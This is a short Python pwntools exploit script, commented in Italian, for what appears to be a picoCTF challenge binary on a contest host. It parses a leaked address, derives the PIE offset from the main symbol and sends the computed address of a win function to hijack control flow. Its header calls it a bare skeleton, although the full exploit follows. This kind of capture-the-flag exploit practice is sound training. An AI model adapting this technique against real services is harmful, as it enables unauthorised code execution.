#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Scheletro pwntools: solo setup iniziale, nessuna funzione

from pwn import *

# ---------- Configurazione ----------
BINARY       = './vuln'           # percorso al binario locale
REMOTE_HOST  = 'rescued-float.picoctf.net'  # host remoto (ncat / netcat)
REMOTE_PORT  = 51532                     # porta remota
USE_LIBC     = False                # True se vuoi caricare una libc esterna
LIBC_PATH    = './libc.so.6'        # percorso della libc (se USE_LIBC = True)

# ---------- Context ----------
context.binary = ELF(BINARY)        # carica ELF e imposta arch/endianness automaticamente
context.log_level = 'info'          # livelli: debug / info / warning / error / critical

# Carica ELF e (opzionale) libc
elf  = context.binary
libc = ELF(LIBC_PATH) if USE_LIBC else None

# ---------- GDB script / parametri ----------
gdbscript = '''
# put your gdb commands here, e.g.:
# b main
# continue
'''
# ---------- Arg parsing convenzionale ----------
# Avviare lo script in 3 modi:
#   python3 exploit.py           -> locale (process)
#   python3 exploit.py GDB       -> avvia con gdb
#   python3 exploit.py REMOTE    -> connetti in remoto
#
# Non eseguiamo nulla ora; qui definiamo solo le variabili/setting.
mode = 'LOCAL'
if 'REMOTE' in args:
    mode = 'REMOTE'
elif 'GDB' in args:
    mode = 'GDB'

# ---------- Placeholder I/O (non eseguito) ----------
io = None
if mode == 'REMOTE':
    io = remote(REMOTE_HOST, REMOTE_PORT)
elif mode == 'GDB':
    io = gdb.debug([BINARY], gdbscript=gdbscript)
else:
    io = process([BINARY])

string = io.recvline().decode()
print(f"Received string: {string}")
address = int(string[19:], 16)
print(f"Leaked address: {hex(address)}")
main = elf.symbols['main']
win = elf.symbols['win']
print(f"Main address: {hex(main)}")
print(f"Win address: {hex(win)}")
offset = address - main
print(f"Calculated offset: {hex(offset)}")
print(f"Win address with offset: {hex(win + offset)}")
payload = hex(win + offset).encode()
io.sendline(payload)
print(io.recvline())
print(io.recvline())
print(io.recvline())

